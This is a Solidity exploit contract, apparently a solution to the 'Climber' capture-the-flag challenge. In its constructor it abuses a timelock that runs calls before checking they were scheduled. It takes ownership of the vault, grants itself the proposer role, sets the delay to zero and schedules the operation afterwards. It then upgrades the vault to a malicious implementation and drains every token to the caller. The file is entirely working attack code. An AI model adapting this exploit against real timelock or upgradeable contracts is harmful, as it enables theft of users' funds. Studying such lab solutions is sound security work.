// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";
import "./ClimberVault.sol";
import "./ThirdParty.sol";
import {PROPOSER_ROLE} from "./ClimberConstants.sol";
import "./PwnedClimberVault.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";

contract ClimberAttacker {
    constructor(ClimberTimelock timelock, ClimberVault vault, address token) {
        ThirdParty thirdParty = new ThirdParty();
        address attacker = address(this);

        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);

        targets[0] = address(vault);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSelector(OwnableUpgradeable.transferOwnership.selector, address(attacker));

        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSelector(AccessControl.grantRole.selector, PROPOSER_ROLE, address(thirdParty));

        targets[2] = address(timelock);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0);

        targets[3] = address(thirdParty);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSelector(ThirdParty.scheduleOperation.selector, attacker, timelock, vault);

        timelock.execute(targets, values, dataElements, 0);

        PwnedClimberVault pwnedVault = new PwnedClimberVault();
        vault.upgradeTo(address(pwnedVault));
        PwnedClimberVault(address(vault)).withdrawAll(token, address(msg.sender));
    }
}
